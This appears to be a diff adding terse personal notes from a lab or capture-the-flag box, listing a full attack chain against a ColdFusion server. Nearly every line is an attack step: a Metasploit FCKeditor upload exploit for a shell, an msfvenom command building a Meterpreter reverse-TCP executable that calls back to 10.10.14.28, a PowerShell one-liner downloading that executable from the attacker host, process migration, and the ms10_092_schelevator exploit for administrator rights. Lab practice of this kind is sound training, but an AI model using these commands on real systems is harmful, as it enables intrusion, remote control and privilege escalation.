@@ -1,0 +1,9 @@
+search coldfusion
+windows/http/coldfusion_fckeditor	//set proxy, and with it see request, modify host, in asnwer is file upload location, set a handler and get shell
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.28 lport=9001 -f exe > file.exe	//use this since the other does not have meterpreter
+powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.28:8000/fil
+e.exe','file.exe')"
+meterpreter>ps
+migrate PID	//conhost.exe for example
+multi/recon/local_exploit_suggester
+windows/local/ms10_092_schelevator	//got admin
